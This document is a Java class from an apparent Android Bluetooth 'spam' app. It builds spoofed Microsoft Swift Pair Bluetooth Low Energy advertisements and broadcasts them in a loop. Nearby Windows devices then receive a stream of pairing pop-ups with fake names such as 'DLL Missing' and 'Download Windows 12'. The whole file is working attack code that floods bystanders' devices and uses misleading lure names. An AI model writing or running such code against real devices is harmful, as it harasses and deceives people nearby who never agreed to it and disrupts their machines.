package com.tutozz.blespam;

import android.bluetooth.le.AdvertiseData;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SwiftPairSpam implements Spammer {
    public String[] devices;
    public AdvertiseData[] devicesAdvertiseData;
    public Runnable blinkRunnable;
    private int loop = 0;
    public boolean isSpamming = false;
    ExecutorService executor = Executors.newSingleThreadExecutor();
    public SwiftPairSpam() throws IOException {
        // Init device names
        devices = new String[]{"Windows Protocol", "DLL Missing", "Download Windows 12"};
        // Init all possible AdvertiseData
        devicesAdvertiseData = new AdvertiseData[devices.length];
        for(int i = 0; i < devices.length; i++){
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            outputStream.write(Helper.convertHexToByteArray("030080"));
            outputStream.write(devices[i].getBytes(StandardCharsets.UTF_8));
            devicesAdvertiseData[i] = new AdvertiseData.Builder()
                    .addManufacturerData(0x0006, outputStream.toByteArray())
                    .build();
        }
    }

    public void start() {
        executor.execute(() -> {
            isSpamming = true;
            for (loop = 0; loop <= Helper.MAX_LOOP; loop++) {
                if(isSpamming) {
                    // Random AdvertiseData
                    AdvertiseData data = devicesAdvertiseData[new Random().nextInt(devicesAdvertiseData.length)];
                    // Advertise
                    BluetoothAdvertiser b = new BluetoothAdvertiser();
                    b.advertise(data, null);
                    // Wait before next advertise
                    try {
                        Thread.sleep(Helper.delay);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    // Stop this advertise to start the next one
                    b.stopAdvertising();
                }
            }
        });
    }

    public boolean isSpamming(){ return isSpamming; }
    public void stop() { loop = Helper.MAX_LOOP+1; isSpamming = false; }
    public Runnable getBlinkRunnable(){ return blinkRunnable; }
    public void setBlinkRunnable(Runnable blinkRunnable){ this.blinkRunnable = blinkRunnable; }
}
